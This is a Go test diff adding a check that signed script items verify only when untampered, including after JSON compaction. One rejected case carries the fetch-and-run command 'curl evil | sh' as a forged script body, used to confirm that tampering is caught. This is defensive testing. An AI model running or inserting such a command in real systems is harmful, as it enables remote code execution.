@@ -3,6 +3,7 @@ package server
 import (
 	"bytes"
 	"crypto/ecdsa"
+	"crypto/ed25519"
 	"crypto/elliptic"
 	"crypto/rand"
 	"crypto/tls"
@@ -304,5 +305,27 @@ func TestConsoleNetworks(t *testing.T) {
 	}
 	if !consoleAllowed(&runtimeState{}, "203.0.113.9") {
 		t.Fatal("empty lists must allow every network")
+	}
+}
+
+func TestItemSignatures(t *testing.T) {
+	_, key, _ := ed25519.GenerateKey(nil)
+	prev := itemKey
+	itemKey = key
+	defer func() { itemKey = prev }()
+	payload := []byte(`{"scripts": [{"name": "x", "body": "echo hi"}]}`)
+	sig := signItem("ops", "com.limdm.scripts", payload)
+	if !itemSignatureOK("ops", "com.limdm.scripts", []byte(`{"scripts":[{"name":"x","body":"echo hi"}]}`), sig) {
+		t.Fatal("the same payload, compacted, must verify")
+	}
+	for _, c := range []struct{ name, typ, payload, sig string }{
+		{"ops", "com.limdm.scripts", `{"scripts":[{"name":"x","body":"curl evil | sh"}]}`, sig},
+		{"ops", "com.limdm.sudo", string(payload), sig},
+		{"other", "com.limdm.scripts", string(payload), sig},
+		{"ops", "com.limdm.scripts", string(payload), ""},
+	} {
+		if itemSignatureOK(c.name, c.typ, []byte(c.payload), c.sig) {
+			t.Errorf("accepted %+v", c)
+		}
 	}
 }
